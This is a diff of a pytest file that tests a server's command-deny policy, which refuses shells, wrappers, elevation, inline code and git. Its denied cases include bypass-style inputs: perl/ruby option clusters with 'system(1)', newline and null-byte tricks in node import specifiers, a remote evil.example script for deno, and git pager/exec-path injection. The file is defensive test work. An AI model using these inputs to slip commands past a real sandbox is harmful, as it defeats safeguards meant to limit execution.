@@ -1,6 +1,6 @@
 """SOLUSDEV-317 — the server's mirror of the cloud CommandPolicy deny table
 (docs/api/code-command-execution.md §4): shells, wrappers, elevation, inline
-code and git config injection are refused; ordinary argv is not."""
+code and git (SOL uses the dedicated git tools) are refused; ordinary argv is not."""
 
 import pytest
 
@@ -57,11 +57,8 @@ def test_tables_are_plain_frozen_literals_matching_the_spec() -> None:
         "bun": frozenset({"-e", "--eval", "-p", "--print"}),
         "Rscript": frozenset({"-e"}),
     }
-    assert deny.GIT_DENIED_GLOBAL_OPTIONS == frozenset({"-c", "--config-env", "--exec-path"})
-    assert {"-C", "--git-dir", "--work-tree", "--no-pager", "--bare", "-P"} <= (
-        deny.GIT_SAFE_GLOBAL_OPTIONS
-    )
-    assert not deny.GIT_SAFE_GLOBAL_OPTIONS & deny.GIT_DENIED_GLOBAL_OPTIONS
+    assert deny.GIT_PROGRAMS == frozenset({"git"})
+    assert not hasattr(deny, "GIT_SAFE_GLOBAL_OPTIONS")
     with pytest.raises(TypeError):
         deny.INLINE_CODE["python"] = frozenset()
 
@@ -139,7 +136,35 @@ def test_tables_are_plain_frozen_literals_matching_the_spec() -> None:
         ["deno", "--quiet", "eval", "1"],
         ["deno", "run", "https://evil.example/x.ts"],
         ["deno", "run", "data:application/typescript,1"],
-        # git: config injection before the subcommand, unknown global options
+        # git and git-* helpers are denied programs (dedicated git tools exist)
+        ["git", "status"],
+        ["git", "--version"],
+        ["/usr/bin/git", "log"],
+        ["GIT", "diff"],
+        ["git-upload-pack", "."],
+        ["git-receive-pack", "."],
+        ["git-shell", "-c", "x"],
+        ["git-lfs", "install"],
+        ["git2.43", "status"],
+        # final round: perl/ruby clusters, specifier whitespace/control, GNU g-wrappers
+        ["perl", "-wMFoo;system(1)", "s.pl"],
+        ["perl", "-wM", "Foo;x", "s.pl"],
+        ["perl", "-I/tmp x", "s.pl"],
+        ["ruby", "-wrjson;x", "s.rb"],
+        ["ruby", "-wI", "data:x", "s.rb"],
+        ["node", "--import", "./x.mjs\nhttp://evil", "x.js"],
+        ["node", "--import", "./a b.mjs", "x.js"],
+        ["node", "--require=./x\x00", "x.js"],
+        ["deno", "run", "./main.ts\t", "x"],
+        ["gtimeout", "5", "make"],
+        ["genv", "make"],
+        ["gxargs", "rm"],
+        ["gstdbuf", "-o0", "make"],
+        ["gnice", "make"],
+        ["gnohup", "make"],
+        ["timeout-1.0", "5", "make"],
+        ["sudo-rs", "ls"],
+        ["xargs4", "rm"],
         ["git", "-ccore.pager=x", "log"],
         ["git", "--config-env", "core.pager=X", "log"],
         ["git", "--exec-path=/tmp/x", "status"],
@@ -219,8 +244,6 @@ def test_denied_argv(argv: list[str]) -> None:
         ["python", "-Wignore", "x.py"],
         ["node", "server.js", "-e"],
         ["deno", "run", "eval.ts"],
-        ["git", "commit", "-c", "HEAD"],
-        ["git", "-C", "sub", "status"],
         ["make", "-j4"],
         ["./scripts/build.sh"],
         ["python", "--", "-c"],
@@ -232,26 +255,20 @@ def test_denied_argv(argv: list[str]) -> None:
         ["python", "-X", "dev", "x.py"],
         ["python", "-m", "pip", "install", "-e", "."],
         ["deno", "run", "main.ts", "https://example.com"],
-        ["git", "--no-pager", "log", "-c"],
-        ["git", "--git-dir=.git", "--work-tree=.", "status"],
-        ["git", "--version"],
-        ["git", "-P", "diff"],
         ["makeup"],
+        ["perl", "-wMData::Dumper", "s.pl"],
+        ["ruby", "-wrjson", "s.rb"],
+        ["gitk"],
+        ["gnumake"],
+        ["genhtml", "x"],
         ["shasum", "-a", "256", "f"],
         ["node-gyp", "rebuild"],
-        ["git-lfs", "install"],
         ["perl", "-MData::Dumper", "s.pl"],
         ["perl", "-MFoo=bar,baz", "s.pl"],
         ["ruby", "-r", "json", "s.rb"],
         ["ruby", "-I", "lib/x", "s.rb"],
         ["node", "--import", "file:///w/x.mjs", "x.js"],
         ["deno", "run", "file:///w/main.ts"],
-        ["git", "fetch", "origin"],
-        ["git", "rebase", "main"],
-        ["git", "bisect", "start"],
-        ["git", "submodule", "update", "--init"],
-        ["git", "config", "user.name", "x"],
-        ["git", "push", "-u", "origin", "main"],
     ],
 )
 def test_allowed_argv(argv: list[str]) -> None:
@@ -280,6 +297,10 @@ def test_allowed_argv(argv: list[str]) -> None:
         ("php-cgi", "php"),
         ("node-arm64", "node"),
         ("shasum", "shasum"),
+        ("git-upload-pack", "git"),
+        ("gtimeout", "timeout"),
+        ("sudo-rs", "sudo"),
+        ("genhtml", "genhtml"),
     ],
 )
 def test_program_name_normalises_case_versions_and_aliases(path: str, name: str) -> None:
